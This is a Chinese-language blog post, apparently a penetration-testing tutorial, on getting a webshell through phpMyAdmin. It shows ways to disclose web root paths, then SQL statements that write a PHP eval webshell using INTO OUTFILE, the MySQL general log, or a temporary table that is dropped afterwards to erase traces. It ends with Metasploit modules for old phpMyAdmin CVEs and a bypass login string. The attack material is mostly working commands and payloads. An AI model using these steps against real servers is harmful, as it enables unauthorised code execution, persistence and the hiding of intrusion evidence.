---
title: phpMyadmin的Getshell思路
published: 2021-06-21 16:03
category: Web
draft: false
tags: [phpMyAdmin, GetShell, MySQL]
---

# phpMyadmin的Getshell思路

```
phpMyadmin是一个以PHP为基础的MySQL数据库管理工具，使网站管理员可通过Web接口管理数据库。
```

## phpMyadmin简介

```
phpMyadmin是一个以PHP为基础的MySQL数据库管理工具，使网站管理员可通过Web接口管理数据库。
```

## 信息收集

此部分主要需要收集的是网站物理路径，否则后续无法通过`URL`连接`Shell`

### 物理路径

- 查询数据库存储路径来推测网站物理路径，也可以通过log变量得到

```
select @@datadir;
```

![](/images/posts/phpmyadmin-getshell/1.png)

- 配置文件爆路径：如果注入点有文件读取权限，可通过load_file尝试读取配置文件

```bash
# Windows
c:windowsphp.ini # php配置文件
c:windowssystem32inetsrvMetaBase.xml # IIS虚拟主机配置文件
```

```bash
# Linux
/etc/php.ini # php配置文件
/etc/httpd/conf.d/php.conf
/etc/httpd/conf/httpd.conf # Apache配置文件
/usr/local/apache/conf/httpd.conf
/usr/local/apache2/conf/httpd.conf
/usr/local/apache/conf/extra/httpd-vhosts.conf # 虚拟目录配置文件
```

- 单引号爆路径：直接在URL后面加单引号。要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。www.abc.com/index.php?id=1'
- 错误参数值爆路径：尝试将要提交的参数值改成错误值。www.abc.com/index.php?id=-1
- Nginx文件类型错误解析爆路径：要求Web服务器是Nginx，且存在文件类型解析漏洞。在图片地址后添加/x.php，该图片不但会被当作php文件执行，还有可能爆出物理路径。www.abc.com/bg.jpg/x.php
- Google爆路径

```
site:xxx.com warning

site:xxx.com "fatal error"
```

- 测试文件爆路径

```
www.xxx.com/test.php
www.xxx.com/ceshi.php
www.xxx.com/info.php
www.xxx.com/phpinfo.php
www.xxx.com/php_info.php
www.xxx.com/1.php
```

- 其它

```
/phpMyAdmin/libraries/selectlang.lib.php
/phpMyAdmin/darkblueorange/layout.inc.php
/phpmyadmin/themes/darkblue_orange/layout.inc.php
/phpMyAdmin/index.php?lang[]=1
/phpMyAdmin/darkblueorange/layout.inc.php phpMyAdmin/index.php?lang[]=1
/phpmyadmin/libraries/lect_lang.lib.php

/phpMyAdmin/phpinfo.php
/phpmyadmin/themes/darkblue_orange/layout.inc.php
/phpmyadmin/libraries/select_lang.lib.php
/phpmyadmin/libraries/mcrypt.lib.php
```

## 其它信息

- phpMyadmin后台面板可以直接看到MySQL版本、当前用户、操作系统、PHP版本、phpMyadmin版本等信息
- 也可以通过SQL查询得到其它信息

```
select version(); -- 查看数据库版本
select @@datadir; -- 查看数据库存储路径
show VARIABLES like '%char%'; -- 查看系统变量
```

## GetShell

### 前提条件

- 网站真实路径。如果不知道网站真实路径则后续无法**通过****URL的方式连****shell**
- 读写权限。查询secure_file_priv参数，查看是否具有读写文件权限，若为NULL则没有办法写入shell。**这个值是只读变量，只能通过配置文件修改，且更改后需重启服务才生效**

```
select @@secure_file_priv -- 查询secure_file_priv

-- secure_file_priv=NULL,禁止导入导出

-- secure_file_priv='',不限制导入导出

-- secure_file_priv=/path/,只能向指定目录导入导出

select load_file('c:/phpinfo.php'); -- 读取文件

select '123' into outfile 'c:/shell.php'; -- 写入文件
```

### 常规GetShell

直接通过SQL查询写入shell

```
-- 假设物理路径为 "G:phpStudyWWW"

select '<?php eval($_POST["pwd"]);?>' into outfile 'G:/phpStudy/WWW/shell.php';
```

### 日志GetShell

MySQL5.0版本以上会创建日志文件，通过修改日志的全局变量打开日志并指定日志保存路径，再通过查询写入一句话木马，此时该木马会被日志记录并生成日志文件，从而GetShell。但是前提是要对生成的日志文件有读写权限。

- ### 查询日志全局变量

  - general_log：日志保存状态
  - general_log_file：日志保存路径

```
show variables like '%general%';

Variable_name Value

general_log OFF

general_log_file G:phpStudyMySQLdataFengSec.log
```

- ### 开启日志保存并配置保存路径

```
set global general_log = "ON"; -- 打开日志保存

set global general_log_file = "G:/phpstudy/WWW/log.php"; -- 设置日志保存路径,需先得知网站物理路径,否则即使写入了Shell也无法通过URL连接
```

- ### 写shell

```
select '<?php eval($_POST[pwd]); ?>;
```

### 新表GetShell

- ### 进入一个数据库，新建数据表。

  - 名字随意，这里为shell_table
  - 字段数填1

![](/images/posts/phpmyadmin-getshell/2.png)

- ### 添加字段

  - 字段名任意，这里为xiaoma
  - 字段类型为TEXT

![](/images/posts/phpmyadmin-getshell/3.png)

- ### 在该表中点击插入，值为一句话木马

```
<?php eval($_POST[pwd]); ?>
```

![](/images/posts/phpmyadmin-getshell/4.png)

- ### 执行SQL查询，将该表中的内容导出到指定文件

```
-- 假设物理路径为 "G:phpStudyWWW"

select * from shell_table into outfile "G:/phpstudy/WWW/shell.php";
```

![](/images/posts/phpmyadmin-getshell/5.png)

- ### 删除该表，抹除痕迹

```
Drop TABLE IF EXISTS shell_table;
```

- ### 以上步骤也可以通过MySQL语句执行

```
Create TABLE shell_table (xiaoma text NOT NULL) -- 建表

Insert INTO shell_table (xiaoma) VALUES('<?php eval($_POST[1]);?>'); -- 写入

select * from shell_table into outfile 'G:/phpstudy/WWW/shell.php'; -- 导出

Drop TABLE IF EXISTS shell_table; -- 删表
```

## 特殊版本GetShell

**CVE-2013-3238**

- 影响版本：3.5.x < 3.5.8.1 and 4.0.0 < 4.0.0-rc3 ANYUN.ORG
- 利用模块：exploit/multi/http/phpmyadminpregreplace

**CVE-2012-5159**

- 影响版本：phpMyAdmin v3.5.2.2
- 利用模块：exploit/multi/http/phpmyadmin3522_backdoor

**CVE-2009-1151**

PhpMyAdmin配置文件/config/config.inc.php存在命令执行

- 影响版本：2.11.x < 2.11.9.5 and 3.x < 3.1.3.1
- 利用模块：exploit/unix/webapp/phpmyadmin_config

## 弱口令&万能密码

- 弱口令：版本phpmyadmin2.11.9.2，直接root用户登陆，无需密码
- 万能密码：版本2.11.3 / 2.11.4，用户名'localhost'@'@"则登录成功